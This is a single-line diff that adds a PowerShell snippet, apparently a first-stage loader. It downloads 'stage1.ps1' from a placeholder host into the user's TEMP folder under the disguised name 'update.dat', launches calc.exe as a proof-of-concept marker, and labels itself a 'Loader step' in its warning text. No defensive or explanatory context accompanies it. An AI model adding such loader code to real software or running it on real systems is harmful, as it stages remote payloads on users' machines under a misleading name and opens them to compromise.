@@ -1,0 +1,1 @@
+$FetchUrl = "https://example.com/stage1.ps1"; $OutputPath = "$env:TEMP\update.dat"; $TimeoutSec = 15; try { Invoke-WebRequest -Uri $FetchUrl -OutFile $OutputPath -UseBasicParsing; Start-Process -FilePath "calc.exe"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Loader step failed" }
